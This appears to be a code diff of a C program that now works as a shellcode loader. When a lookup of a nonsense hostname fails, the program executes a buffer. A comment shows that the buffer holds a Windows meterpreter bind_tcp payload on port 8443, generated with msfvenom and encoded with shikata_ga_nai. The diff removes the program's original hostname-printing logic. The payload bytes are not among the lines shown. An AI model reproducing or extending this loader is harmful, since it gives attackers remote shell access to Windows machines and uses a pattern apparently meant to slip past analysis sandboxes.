@@ -9,16 +9,8 @@ int error;
 
 int main(int argc, char **argv) {
 
-	//version = MAKEWORD( 2, 0 );
-	//error = WSAStartup( version, &wsaData );
-/*
-	if (argc < 2) {
-		fprintf(stderr,"Usage: %s hostname\n", argv[0]);
-		exit(1);
-	}*/
 	struct hostent *hp = gethostbyname("adsfadsfasdf.asdfasdfasdf");//gethostbyname(argv[1]);
 	if (hp == NULL) {
-		//fprintf(stderr,"gethostbyname() failed\n");
 
 		//msfvenom -p windows/meterpreter/bind_tcp lport=8443 -e x86/shikata_ga_nai -f c -a x86 --platform Windows
 		unsigned char buf[] = 
@@ -49,15 +41,7 @@ int main(int argc, char **argv) {
 		funct = (int (*)()) buf;
 		(int)(*funct)();
 
-		exit(0);
-	} /* else {
-		printf("%s = ", hp->h_name);
-		unsigned int i=0;
-		while ( hp -> h_addr_list[i] != NULL) {
-			printf( "%s ", inet_ntoa( *( struct in_addr*)( hp -> h_addr_list[i])));
-			i++;
-		}
-		printf("\n");
-		exit(0);
-	} */
+	}
+
+	return 0;
 }
